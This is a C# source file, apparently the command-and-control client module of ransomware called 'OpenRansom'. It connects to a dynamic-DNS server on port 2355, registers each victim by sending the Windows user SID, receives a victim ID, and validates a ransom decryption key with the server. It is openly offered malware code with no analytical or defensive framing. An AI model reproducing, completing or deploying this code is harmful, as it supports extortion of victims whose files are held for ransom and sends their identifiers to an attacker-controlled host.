using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace OpenRansom
{
    public static class OpenRansom
    {
        static TcpClient client;
        static NetworkStream stream;
        static string id = "";
        static string validity = "";

        public static void connecttoserver()
        {
        re:
            try
            {
                var ip = Dns.GetHostAddresses("openransom.ddns.net")[0];
                client = new TcpClient(ip.ToString(), 2355);
                stream = client.GetStream();
                Send("registervic|" + System.Security.Principal.WindowsIdentity.GetCurrent().User.Value);
                Task.Run(() =>
                {
                    while (true)
                    {
                        try
                        {
                            stream = client.GetStream();

                            string[] rec = Recieve();

                            switch (rec[0])
                            {
                                case "REGISTERED":
                                    id = rec[1];
                                    break;
                                case "KEYVALID":
                                    validity = "y";
                                    break;
                                case "KEYINVALID":
                                    validity = "n";
                                    break;
                            }
                            Thread.Sleep(500);
                        }
                        catch { Thread.Sleep(1000); }
                    }
                });
            }
            catch { Thread.Sleep(1000);  goto re; }
        }

        public static string getid()
        {
            retry:

            if(id != "")
            {
                return id;
            }
            else
            {
                Thread.Sleep(100);
                goto retry;
            }
        }

        public static bool checkkey(string id, string key)
        {
            try
            {
                Send("checkkey|" + id + "|" + key + "|" + System.Security.Principal.WindowsIdentity.GetCurrent().User.Value);
                Thread.Sleep(100);
            retry:
                if (validity == "")
                {
                    Thread.Sleep(100);
                    goto retry;
                }
                else if (validity == "n")
                {
                    validity = "";
                    return false;
                }
                else if (validity == "y")
                {
                    validity = "";
                    return true;
                }
            }
            catch { return false; }
            return false;
        }

        public static void Send(string data)
        {
            try
            {
                byte[] bytes = Encoding.ASCII.GetBytes(data + "|");

                stream.Write(bytes, 0, bytes.Length);
            }
            catch { }
        }

        private static string[] Recieve()
        {
            try
            {
                byte[] bytes = new byte[65565];

                stream.Read(bytes, 0, bytes.Length);

                stream.Flush();

                return Encoding.ASCII.GetString(bytes).Split('|');
            }
            catch (Exception ex)
            {

            }
            return "|".Split('|');
        }
    }
}
